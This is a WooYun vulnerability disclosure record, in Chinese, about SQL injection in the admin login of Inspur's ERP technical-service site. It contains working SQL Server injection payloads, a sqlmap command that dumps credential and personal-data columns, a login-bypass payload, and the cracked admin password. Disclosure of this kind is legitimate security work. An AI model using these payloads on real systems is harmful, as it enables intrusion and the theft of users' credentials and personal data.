{"id": 2795, "wybug_id": "wooyun-2014-063420", "wybug_title": "浪潮ERP技术服务网存在post注入", "wybug_corp": "浪潮集团", "wybug_author": "greetwin", "wybug_date": "2014-06-04 19:15", "wybug_open_date": "2014-07-23 19:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浪潮", "结合手工注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-07-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 浪潮ERP技术服务网后台登陆框存在post注入，问题参数时username。因为是asp的站点，数据库的表和字段都很奇葩，sqlmap跑不出来，但手工可注出表和字段。爆出管理员的用户名和密码可登陆后台。 详细说明：  1、很巧合的打开了浪潮ERP技术服务网，习惯性的抓包丢到sqlmap里面，很快出结果了，username参数存在注入。\n\n2、但是继续爆表的时候出错了，一个表也没爆出来。看来这个asp站点，数据库的表和字段都很奇葩。那就只好手工注入了。3、输入\n'having 1=1--\n，报错\n\n由此可知：此处存在表wz_userqt，且其中一个字段为wz_userqtid4、继续爆其他字段\n1' and 1=convert(int,(select top 1 col_name(object_id (' wz_userqt '),2) from wz_userqt)) and '1'='1\n \n\n存在一个字段为x_userqtname5、以此可爆出20个字段。其中比较重要的有：x_userqtname,x_userqtpassword,mmwt,mmda,email,sex,company,phone,mobile6、接下来就用sqlmap跑一下字段里的内容。但是不知道上述爆出来的表和字段是哪个数据库的，那就每个数据库都跑一遍，有数据的自然是对应的数据库。果然经过测试数据库是tr。\nSqlmap -l d:/post.txt -D tr -T wz_userqt -C \"x_userqtname,x_userqtpassword,mmwt,mmda,email,sex,company,phone,mobile\" --dump\n\n\n7、cmd5破解密码为123456.\n\n8、但是登陆的时候报错。\n\n9、没关系，绕一下就可以了。用户名为\na%' and (select is_member('db_owner'))=1--\n密码为123456\n\n这里只是爆出了管理员表，其他的也就不管了，关兴趣的可以使用如下代码爆出。\n1' and 1=convert(int,(select top 1 name from sysobjects where xtype='U' and name not in ('wz_userqt' ))) and '1'='1\n   漏洞证明：  1、注入点\n\n2、爆出管理表的字段内容\n\n3、成功登陆后台\n\n   修复方案：  过滤好输入的参数。   版权声明：转载请注明来源 greetwin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-08-05 22:12 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  手工注入有些厉害！    \n     2014-08-07 15:21 |    \t\tgreetwin \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | you can you up，no can no bb！)\t\t \n  @进击的zjx O(∩_∩)O哈哈~，小菜菜一只，欢迎私下交流，我乌云上没怎么提交漏洞，在360上提交了几十个了。 qq：541903848    \n     2014-08-07 18:10 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  @greetwin  大神别谦虚，我才是真菜。。对了，360上我看漏洞提交很少啊，是不是只能提交关于360的漏洞？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}